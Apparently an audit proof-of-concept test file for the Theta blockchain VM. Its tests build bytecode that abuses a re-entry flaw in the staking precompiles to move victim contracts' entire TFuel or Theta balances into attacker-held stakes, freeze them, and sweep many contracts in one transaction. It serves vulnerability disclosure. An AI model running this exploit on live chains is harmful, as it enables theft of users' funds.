package vm

// AUDIT PoC F - the same frame-identity leak reaches the STAKING precompiles.
//
// #23/#23b/#23c/#23d/#24 only ever moved *Theta* through 0xCB. But 0xCC
// (stakeToGuardian) and 0xCE (stakeToEEN) also use `contract.CallerAddress` as
// the *owner* of the funds being staked:
//
//	ledger/vm/vm.go:120  StakeToGuardian(db, sender=contract.CallerAddress, ...)
//	ledger/vm/vm.go:183  StakeToEEN    (db, sender=contract.CallerAddress, ...)
//
// and, crucially, BOTH skip the BLS ownership proof when the guardian / EEN
// already exists (vm.go:143 `if !gcp.Contains(guardianAddr)` and vm.go:207
// `if een == nil && !checkBlsSummary(...)`).
//
// So an attacker who is re-entered by a victim contract can delegatecall the
// staking precompile and move the victim's ENTIRE TFuel balance (0xCE) or
// THETA balance (0xCC) out of the victim's account into a stake whose holder is
// the attacker. That is a different asset (TFuel = the gas token; and staked
// Theta = the asset that #23 never touched), a different precompile, and it
// needs no cooperation from the victim beyond the outgoing call that #24
// already exploits.
//
// Consequences measured below:
//   - victim's balance (TFuel or Theta) drops to 0 in one transaction,
//   - the funds sit in a stake owned by the attacker's guardian/EEN, locked for
//     core.ReturnLockingPeriod (28,800 blocks) after any unstake,
//   - the attacker's reward-distribution rule skims up to 10% of the yield of
//     the victim's stake (the rest still accrues to the victim),
//   - a contract whose logic reads its own balance (0xC9) becomes insolvent.

import (
	"encoding/hex"
	"fmt"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/core"
	"github.com/thetatoken/theta/crypto/bls"
	"github.com/thetatoken/theta/ledger/state"
)

// rightPad32 right-aligns b inside a 32-byte big-endian word.
func rightPad32(b []byte) []byte {
	out := make([]byte, 32)
	copy(out[32-len(b):], b)
	return out
}

// precompileDelegatePayload builds a runtime that
//
//	<mem[0:len(payload)] = payload> ; DELEGATECALL(gas, precompile, 0, len, 0, 0) ; STOP
//
// so the precompile observes the *delegating* frame's CallerAddress.
func precompileDelegatePayload(precompile byte, payload []byte) string {
	var b []byte
	p := append([]byte{}, payload...)
	for len(p)%32 != 0 {
		p = append(p, 0)
	}
	for i := 0; i < len(p); i += 32 {
		b = append(b, 0x7f) // PUSH32
		b = append(b, p[i:i+32]...)
		if i < 0x100 {
			b = append(b, 0x60, byte(i))
		} else {
			b = append(b, 0x61, byte(i>>8), byte(i))
		}
		b = append(b, 0x52) // MSTORE
	}
	size := len(p)
	b = append(b, 0x60, 0x00)                    // outSize
	b = append(b, 0x60, 0x00)                    // outOffset
	b = append(b, 0x61, byte(size>>8), byte(size)) // inSize
	b = append(b, 0x60, 0x00)                    // inOffset
	b = append(b, 0x60, precompile)              // to
	b = append(b, 0x5a)                          // GAS
	b = append(b, 0xf4)                          // DELEGATECALL
	b = append(b, 0x00)                          // STOP
	return hex.EncodeToString(b)
}

// dispatcher: if CALLER == entry it CALLs the victim, otherwise it runs `body`.
func dispatcher(entry, victim common.Address, bodyHex string) []byte {
	var b []byte
	app := func(h string) {
		d, err := hex.DecodeString(h)
		if err != nil {
			panic(err)
		}
		b = append(b, d...)
	}
	body, err := hex.DecodeString(bodyHex)
	if err != nil {
		panic(err)
	}

	app("33" + push20hex(entry) + "14") // CALLER == entry
	loopOffPos := len(b)
	app("610000")
	app("57") // JUMPI

	b = append(b, body...) // re-entry path
	loopOffset := len(b)
	b[loopOffPos+1] = byte(loopOffset >> 8)
	b[loopOffPos+2] = byte(loopOffset)

	app("5b")                                 // JUMPDEST
	app("60006000600060006000")               // outSize,outOff,inSize,inOff,value
	app(push20hex(victim))
	app("5a" + "f1" + "00") // CALL ; STOP
	return b
}

// blsSummary builds the 229-byte summary the precompiles parse. The holder
// signature is never verified when the guardian/EEN already exists.
func blsSummary(t *testing.T, holder common.Address, pub *bls.PublicKey, pop *bls.Signature) []byte {
	t.Helper()
	summary := make([]byte, 229)
	copy(summary[0:20], holder.Bytes())
	copy(summary[20:68], pub.ToBytes())
	copy(summary[68:164], pop.ToBytes())
	// summary[164:229] = holder sig, not checked for an existing holder
	return summary
}

// TestAuditF1_ThirdPartyStakesVictimTFuelIntoAttackerEEN
func TestAuditF1_ThirdPartyStakesVictimTFuelIntoAttackerEEN(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000001")
	sv := newAuditView(t)

	// the attacker registers his own EEN with the minimum stake (10000 TFuel)
	eenp := state.NewEliteEdgeNodePool(sv, false)
	if err := eenp.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN registration: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	// victim contract holds 250k TFuel and does the innocent callback
	victimTFuel := tfuelN(250000)
	setBalance(t, sv, victimCtr, big.NewInt(0), victimTFuel)
	setCode(t, sv, victimCtr, victimCallbackToSender())

	// attacker contract: on re-entry, delegatecall 0xCE with the attacker's
	// EEN summary and the victim's whole TFuel balance as the amount.
	payload := make([]byte, 293)
	copy(payload[0:229], blsSummary(t, eenAddr, pub, pop))
	copy(payload[261:293], rightPad32(victimTFuel.Bytes()))
	body := precompileDelegatePayload(0xce, payload)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, victimCtr, body)))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	_, err = runTx(t, sv, attackerEOA, attackerCtr, nil, 6_000_000, big.NewInt(0), big.NewInt(0))
	if err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	staked := eenp2GetStake(t, sv, eenAddr, victimCtr)
	t.Logf("err                        = %v", err)
	t.Logf("victim contract TFuel      = %v", tfuelOf(sv, victimCtr))
	t.Logf("victim stake in attacker EEN = %v (holder=%v)", staked, eenAddr.Hex())
	t.Logf("total EEN stake            = %v", sv.GetTotalEENStake())

	if tfuelOf(sv, victimCtr).Sign() != 0 {
		t.Fatalf("victim TFuel not confiscated, balance = %v", tfuelOf(sv, victimCtr))
	}
	if staked == nil || staked.Cmp(victimTFuel) != 0 {
		t.Fatalf("expected a %v TFuel stake owned by the victim, got %v", victimTFuel, staked)
	}
}

func eenp2GetStake(t *testing.T, sv *state.StoreView, eenAddr, source common.Address) *big.Int {
	t.Helper()
	pool := state.NewEliteEdgeNodePool(sv, true)
	een := pool.Get(eenAddr)
	if een == nil {
		return nil
	}
	for _, s := range een.Stakes {
		if s.Source == source {
			return s.Amount
		}
	}
	return nil
}

// TestAuditF2_ThirdPartyStakesVictimThetaIntoAttackerGuardian
func TestAuditF2_ThirdPartyStakesVictimThetaIntoAttackerGuardian(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	guardianAddr := common.HexToAddress("0xAA00000000000000000000000000000000000001")
	sv := newAuditView(t)

	// attacker registers his own guardian (min stake 1000 Theta)
	gcp := sv.GetGuardianCandidatePool()
	if err := gcp.DepositStake(attackerEOA, guardianAddr, thetaN(1000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("guardian registration: %v", err)
	}
	sv.UpdateGuardianCandidatePool(gcp)
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	victimTheta := thetaN(5000)
	setBalance(t, sv, victimCtr, victimTheta, big.NewInt(0))
	setCode(t, sv, victimCtr, victimCallbackToSender())

	payload := make([]byte, 261)
	copy(payload[0:229], blsSummary(t, guardianAddr, pub, pop))
	copy(payload[229:261], rightPad32(victimTheta.Bytes()))
	body := precompileDelegatePayload(0xcc, payload)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, victimCtr, body)))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 6_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	gcp2 := sv.GetGuardianCandidatePool()
	var staked *big.Int
	for _, g := range gcp2.SortedGuardians {
		if g.Holder == guardianAddr {
			for _, s := range g.Stakes {
				if s.Source == victimCtr {
					staked = s.Amount
				}
			}
		}
	}

	t.Logf("victim contract Theta      = %v", thetaOf(sv, victimCtr))
	t.Logf("victim stake in attacker guardian = %v (holder=%v)", staked, guardianAddr.Hex())

	if thetaOf(sv, victimCtr).Sign() != 0 {
		t.Fatalf("victim Theta not confiscated, balance = %v", thetaOf(sv, victimCtr))
	}
	if staked == nil || staked.Cmp(victimTheta) != 0 {
		t.Fatalf("expected a %v Theta stake owned by the victim, got %v", victimTheta, staked)
	}
}

// TestAuditF3_AttackerCanThenFreezeTheStake shows the second half of the
// primitive: the same identity leak lets a third party call 0xCD
// (unstakeFromGuardian) on the victim's stake, which marks it withdrawn and
// locks it for core.ReturnLockingPeriod blocks.
func TestAuditF3_AttackerCanFreezeTheStake(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()

	guardianAddr := common.HexToAddress("0xAA00000000000000000000000000000000000002")
	sv := newAuditView(t)

	gcp := sv.GetGuardianCandidatePool()
	if err := gcp.DepositStake(attackerEOA, guardianAddr, thetaN(1000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("guardian registration: %v", err)
	}
	// victim already has a stake in the attacker's guardian
	if err := gcp.DepositStake(victimCtr, guardianAddr, thetaN(5000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("victim stake: %v", err)
	}
	sv.UpdateGuardianCandidatePool(gcp)
	setBalance(t, sv, victimCtr, big.NewInt(0), big.NewInt(0))
	setCode(t, sv, victimCtr, victimCallbackToSender())
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	// 0xCD input = the guardian address
	payload := rightPad32(guardianAddr.Bytes())
	body := precompileDelegatePayload(0xcd, payload)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, victimCtr, body)))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 6_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	var withdrawn, returnHeight uint64
	for _, g := range sv.GetGuardianCandidatePool().SortedGuardians {
		if g.Holder == guardianAddr {
			for _, s := range g.Stakes {
				if s.Source == victimCtr {
					if s.Withdrawn {
						withdrawn = 1
					}
					returnHeight = s.ReturnHeight
				}
			}
		}
	}
	t.Logf("victim stake withdrawn = %v, returnHeight = %v (current height %v, ReturnLockingPeriod = %v)",
		withdrawn == 1, returnHeight, sv.Height(), core.ReturnLockingPeriod)
	if withdrawn == 0 {
		t.Fatalf("victim stake was not force-withdrawn")
	}
	if returnHeight != sv.Height()+core.ReturnLockingPeriod {
		t.Fatalf("unexpected return height %v", returnHeight)
	}
}

// sweepStakeContract: entry path CALLs every victim (each of which calls back),
// re-entry path runs `body`.
func sweepStakeContract(entry common.Address, victims []common.Address, bodyHex string) []byte {
	var b []byte
	app := func(h string) {
		d, err := hex.DecodeString(h)
		if err != nil {
			panic(err)
		}
		b = append(b, d...)
	}
	body, err := hex.DecodeString(bodyHex)
	if err != nil {
		panic(err)
	}
	app("33" + push20hex(entry) + "14")
	loopOffPos := len(b)
	app("610000")
	app("57")
	b = append(b, body...)
	loopOffset := len(b)
	b[loopOffPos+1] = byte(loopOffset >> 8)
	b[loopOffPos+2] = byte(loopOffset)
	app("5b") // JUMPDEST
	for _, v := range victims {
		app("60006000600060006000")
		app(push20hex(v))
		app("5a" + "f1" + "50") // CALL ; POP
	}
	app("00")
	return b
}

// TestAuditF4_OneTxConfiscatesTFuelFromManyContracts measures the multiplier:
// a single transaction moves the TFuel of N different contracts into the
// attacker's EEN.
func TestAuditF4_OneTxConfiscatesTFuelFromManyContracts(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()
	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000002")

	const n = 5
	perVictim := tfuelN(20000)

	build := func() (*state.StoreView, []common.Address) {
		sv := newAuditView(t)
		eenp := state.NewEliteEdgeNodePool(sv, false)
		if err := eenp.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
			t.Fatalf("EEN registration: %v", err)
		}
		victims := make([]common.Address, n)
		for i := 0; i < n; i++ {
			v := common.HexToAddress(fmt.Sprintf("0x%040x", 0xC00000+i))
			victims[i] = v
			setBalance(t, sv, v, big.NewInt(0), perVictim)
			setCode(t, sv, v, victimCallbackToSender())
		}
		payload := make([]byte, 293)
		copy(payload[0:229], blsSummary(t, eenAddr, pub, pop))
		copy(payload[261:293], rightPad32(perVictim.Bytes()))
		body := precompileDelegatePayload(0xce, payload)
		setCode(t, sv, attackerCtr, hex.EncodeToString(sweepStakeContract(attackerEOA, victims, body)))
		setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))
		setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))
		return sv, victims
	}

	sv, victims := build()
	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 20_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}
	for i, v := range victims {
		if tfuelOf(sv, v).Sign() != 0 {
			t.Fatalf("victim %d keeps TFuel %v", i, tfuelOf(sv, v))
		}
	}
	pool := state.NewEliteEdgeNodePool(sv, true)
	een := pool.Get(eenAddr)
	t.Logf("%d contracts had their ENTIRE TFuel balance moved into one attacker EEN", n)
	t.Logf("EEN total stake now = %v TFuelWei (%v TFuel)", een.TotalStake(), new(big.Int).Div(een.TotalStake(), big.NewInt(1e18)))
	for _, s := range een.Stakes {
		t.Logf("  stake source=%v amount=%v", s.Source.Hex(), s.Amount)
	}

	// gas measurement
	sv2, _ := build()
	tx := smartTx(attackerEOA, attackerCtr, nil, 20_000_000)
	_, _, gasUsed, err := Execute(NewBlockInfo(auditHeight, big.NewInt(1), "mainnet"), tx, sv2)
	if err != nil {
		t.Fatalf("gas run failed: %v", err)
	}
	t.Logf("gasUsed for %d victims in one tx = %d  (~%d gas per confiscated contract, 0xC9 is not even needed)",
		n, gasUsed, gasUsed/uint64(n))
}
